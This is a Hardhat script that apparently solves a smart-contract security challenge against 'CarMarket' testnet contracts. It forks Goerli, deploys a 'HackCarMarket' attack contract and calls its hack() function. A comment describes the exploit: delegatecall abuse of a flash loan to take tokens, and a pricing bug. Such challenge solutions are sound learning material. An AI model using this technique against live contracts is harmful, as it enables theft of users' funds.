const hre = require("hardhat");
const { ethers, network } = hre;

// https://goerli.etherscan.io/address/0x66408824a99ff61ae2e032e3c7a461ded1a6718e
const tokenAddress = '0x66408824a99ff61ae2e032e3c7a461ded1a6718e';
// https://goerli.etherscan.io/address/0x07abfcced19aeb5148c284cd39a9ff2ac835960a
const marketAddress = '0x07AbFccEd19Aeb5148C284Cd39a9ff2Ac835960A';
// https://goerli.etherscan.io/address/0x012f0c715725683a5405b596f4f55d4ad3046854
const factoryAddress = '0x012f0c715725683A5405B596f4F55D4AD3046854';

// This one is a bit weird. CarFactory has a flashLoan functionality that operates on the
// "carFactory" variable. CarMarket has a delegatecall to the factory. The idea then is to
// delegatecall flashLoan, which will transfer the tokens from the CarMaker contract but will
// execute the checks using the "carFactory" variable, allowing us to effectively steal the funds
// from the CarMaker contract and execute a second purchase. The purchase function also seems to
// have a bug, car cost is determined by the "_carCost" function but then the token transfer
// uses the "CARCOST" constant (which is the base price).
async function main() {
  await network.provider.request({
    method: "hardhat_reset",
    params: [
      {
        forking: {
          jsonRpcUrl: process.env.GOERLI_NODE_URL,
          blockNumber: 7247800,
        },
      },
    ],
  });

  const HackCarMarket = await ethers.getContractFactory("HackCarMarket");
  const hackCarMarket = await HackCarMarket.deploy(tokenAddress, marketAddress, factoryAddress);

  const CarMarket = await ethers.getContractFactory("CarMarket");
  const carMarket = CarMarket.attach(marketAddress);

  const tx = await hackCarMarket.hack();
  console.log('TX: ', tx.hash);
  await tx.wait();

  const carCount = await carMarket.getCarCount(hackCarMarket.address);
  console.log('Car count: ', carCount.toString());

  console.log('Done!');
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
